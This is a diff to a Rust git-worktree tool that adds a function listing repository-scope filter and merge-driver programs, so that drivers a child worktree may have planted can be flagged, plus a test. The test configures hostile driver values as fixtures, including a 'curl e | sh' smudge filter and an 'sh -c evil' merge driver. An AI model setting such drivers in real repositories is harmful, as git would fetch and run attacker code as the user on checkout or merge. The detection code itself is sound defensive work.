@@ -163,3 +163,73 @@ fn common_dir(repo: &Path) -> Result<PathBuf, SpawnError> {
     let p = PathBuf::from(String::from_utf8_lossy(&out.stdout).trim());
     Ok(if p.is_absolute() { p } else { repo.join(p) })
 }
+
+/// **The driver programs the repository's own configuration names**: each `filter.<name>.clean`,
+/// `.smudge` or `.process` and `merge.<name>.driver` key set at `local` or `worktree` scope
+/// (includes followed) in the operator's checkout `repo`. That configuration is the one file
+/// every child worktree shares and may have written, and an attribute — in a branch's
+/// `.gitattributes` or in `info/attributes` beside it — selects such a driver, so a merge or a
+/// checkout would run its program as the operator. The operator's global and system drivers are
+/// theirs and not listed. `Err` where git could not say.
+pub fn repo_drivers(repo: &Path) -> Result<Vec<String>, String> {
+    let out = command(
+        &Tree::Operator(repo),
+        &[
+            "config",
+            "--show-scope",
+            "--includes",
+            "--get-regexp",
+            r"^(filter\..*\.(clean|smudge|process)|merge\..*\.driver)$",
+        ],
+    )
+    .map_err(|e| e.to_string())?
+    .output()
+    .map_err(|e| e.to_string())?;
+    // `git config --get-regexp` exits 1 when nothing matches.
+    match out.status.code() {
+        Some(0) => {}
+        Some(1) => return Ok(Vec::new()),
+        _ => return Err(String::from_utf8_lossy(&out.stderr).trim().to_string()),
+    }
+    Ok(String::from_utf8_lossy(&out.stdout)
+        .lines()
+        .filter_map(|l| {
+            let (scope, rest) = l.split_once('\t')?;
+            let key = rest.split_whitespace().next()?;
+            matches!(scope, "local" | "worktree").then(|| key.to_string())
+        })
+        .collect())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn git(dir: &Path, args: &[&str]) {
+        let st = Command::new("git")
+            .current_dir(dir)
+            .args(args)
+            .stdout(std::process::Stdio::null())
+            .status()
+            .unwrap();
+        assert!(st.success(), "git {args:?}");
+    }
+
+    /// **A driver program in the repository's own configuration is named**, filter and merge
+    /// alike, while its plain merge settings are not drivers and nothing is named where there is
+    /// none.
+    #[test]
+    fn the_repositorys_own_driver_programs_are_named() {
+        let dir = marion_testsupport::scratch("gitcmd-drivers");
+        git(&dir, &["init", "-q"]);
+        assert_eq!(repo_drivers(&dir).unwrap(), Vec::<String>::new());
+        git(&dir, &["config", "merge.conflictStyle", "diff3"]);
+        assert_eq!(repo_drivers(&dir).unwrap(), Vec::<String>::new());
+        git(&dir, &["config", "filter.x.smudge", "curl e | sh"]);
+        git(&dir, &["config", "merge.y.driver", "sh -c evil %O %A %B"]);
+        assert_eq!(
+            repo_drivers(&dir).unwrap(),
+            ["filter.x.smudge", "merge.y.driver"]
+        );
+    }
+}
